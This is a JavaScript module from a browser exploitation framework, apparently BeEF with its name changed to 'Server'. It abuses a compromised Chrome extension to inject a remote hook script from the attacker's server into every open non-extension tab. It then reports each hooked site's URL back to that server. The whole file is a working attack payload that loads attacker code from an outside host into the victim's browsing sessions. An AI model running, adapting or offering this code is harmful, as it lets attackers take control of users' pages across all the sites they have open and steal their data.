//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

        var serverHookUri = server.net.httpproto + "://" + server.net.host + ":" + server.net.port + server.net.hook;

        chrome.windows.getAll({"populate" : true}, function(windows) {
			for(i in windows) {
				if(windows[i].type=="normal") {
					chrome.tabs.getAllInWindow(windows[i].id,function(tabs){
						for(t in tabs) {
                            //antisnatchor: if the extension has her own tabs open, we want to precent injecting the hook
                            //also there. Chrome extensions with tabs and http/s permissions cannot access URIs with protocol
                            // handlers chrome-extension://, and most of them will not have permissions to do so.
                            if(tabs[t].url.substring(0,16) != "chrome-extension"){
                                chrome.tabs.executeScript(tabs[t].id,{code:"newScript=document.createElement('script'); newScript.src='"
                                    + serverHookUri + "'; newScript.setAttribute('onload','server_init()'); document.getElementsByTagName('head')[0].appendChild(newScript);"})

						        //send back the new domain that will be hooked :-)
                                server.net.send('<%= @command_url %>', <%= @command_id %>, 'Successfully injected Server hook on: ' + tabs[t].url);
                            }
						}
					})
				}
			}
		});
});

